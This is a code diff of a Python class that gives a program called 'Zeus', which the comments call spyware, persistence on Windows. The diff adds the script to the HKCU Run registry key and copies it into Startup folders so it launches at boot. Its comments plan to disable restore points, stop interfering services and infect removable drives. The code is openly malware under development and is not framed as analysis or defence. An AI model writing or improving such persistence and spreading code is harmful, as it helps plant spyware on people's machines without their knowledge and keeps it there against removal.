@@ -2,8 +2,14 @@ import platform
 import os
 import os.path
 from shutil import copyfile
+import winreg
+from winreg import CreateKey, OpenKey, ConnectRegistry, SetValueEx
 
-class BootPersistanceHandler(object):
+# Assuming Windows only
+
+# TODO: Change to WindowsBootPersistHandler class
+
+class BootPersistanceHandler:
     WINDOWS_START_UP_FOLDER_PREFIX = ""
     WINDOWS_START_UP_FOLDER_SUFFIX = r"\Start Menu\Programs\StartUp"
     WINDOWS_ALTERNATIVE_START_UP_FOLDER_SUFFIX = r"\AppData\Roaming\Microsoft\Windows\Start"
@@ -13,75 +19,79 @@ class BootPersistanceHandler(object):
     WINDOWS_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
     WINDOWS_ALTERNATIVE_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
 
-    isWindows = False
+    def isWindows():
+        return (platform.system().lower() == "windows")
 
-    @staticmethod
-    def addSelfToSystemToBoot(self, isWindows=None):
-        if isWindows:
+    def addSelfToSystemToBoot(self):
+        if(platform.system().lower() == "windows"):
             # 1. Use registry
             self.implantToRegistry()
 
             # 2. Copy file manually
-            copyFilesManually()
+            self.copyFilesManually()
 
             # 3. Disable restore points
             # 4. Disable windows services which can interfer propy injection to device
             # 5. Constantly check if removable devices is connected and if yes -
             # infect them as well (make spyware startup from removable device)
 
-    @staticmethod
     def implantToRegistry(self):
-        global CheckRegistryKey, keyCheck, setRegistryValue
         try:
-            registryKey = CheckRegistryKey(WINDOWS_REGISTRY_START_UP_PATH, "Zeus", os.path.abspath(__file__))
+            isKeyExistsInRegistry = False
+            registryKey = self.checkRegistryKey(self.WINDOWS_REGISTRY_START_UP_PATH, "Zeus", os.path.abspath(__file__))
             if registryKey:
                 keyCheck = registryKey[0]
 
-            if keyCheck == 1:
-                print("Zeus already installed!")
-            else:
+                if keyCheck == 1:
+                    isKeyExistsInRegistry = True
+                    print("Zeus already installed!")
+
+            if not isKeyExistsInRegistry:
                 print("Implanting Zeus to windows registry")
 
-            didSetRunKey = setRegistryValue(WINDOWS_REGISTRY_START_UP_PATH, os.path.abspath(__file__))
-
-            if not didSetRunKey:
+            didSaveKeySuccessfully = self.setRegistryValue("Zeus", os.path.abspath(__file__))
+            if not didSaveKeySuccessfully:
                 print("Error adding Zeus to windows registry run key.")
-        except ex:
-            print(ex)
-
-    def setRegistryValue(name, value):
-        try:
-            winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
-            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
-            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
-            winreg.CloseKey(registry_key)
-
-            return True
-        except WindowsError:
-              return False
-
-    def CheckRegistryKey(location, softwareName, keyName):
-        aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
-
-        try:
-             aKey = OpenKey(aReg, location)
-        except WindowsError:
-            print(ex)
-            return False
-
-        try:
-            aSubKey = OpenKey(aKey, softwareName)
-            val = QueryValueEx(aSubKey, keyName)
-
-            if val:
-                return True
-            else:
-                return False
-
         except EnvironmentError:
             print(EnvironmentError)
+
+    def setRegistryValue(self, name, value):
+        try:
+            winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.WINDOWS_REGISTRY_START_UP_PATH)
+            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.WINDOWS_REGISTRY_START_UP_PATH,
+                                          0, winreg.KEY_WRITE)
+
+            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
+            winreg.CloseKey(registry_key)
+            return True
+        except WindowsError:
             return False
 
+    def checkRegistryKey(self, regPath, key, value):
+        registryConnect = ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
+        localtz = winreg.OpenKey(registryConnect,  self.WINDOWS_REGISTRY_START_UP_PATH)
+        keyvalues = self.valuestodict(localtz)
+        localtz.Close()
+        print("print list->")
+        print(keyvalues)
+
+
+
+        if "Zeus" in keyvalues:
+            tzkeyname = keyvalues['Zeus']
+            print("tzkeyname: %s" % tzkeyname)
+
+            exit(0)
+            return True
+
+    def valuestodict(self, key):
+        """Convert a registry key's values to a dictionary."""
+        dict = {}
+        size = winreg.QueryInfoKey(key)[1]
+        for i in range(size):
+            data = winreg.EnumValue(key, i)
+            dict[data[0]] = data[1]
+        return dict
 
     def copyFilesManually(self):
         # Copy to 1st directory
@@ -99,10 +109,5 @@ class BootPersistanceHandler(object):
             copyfile(os.path.abspath(__file__), destinationFolder)
 
 
-    isWindows = (platform.system().lower() == "Windows".lower())
-
-    if isWindows:
-        import winreg
-
+    if(platform.system().lower() == "windows"):
         WINDOWS_START_UP_FOLDER_PREFIX = os.environ['WINDIR']
-        print(WINDOWS_START_UP_FOLDER_PREFIX)
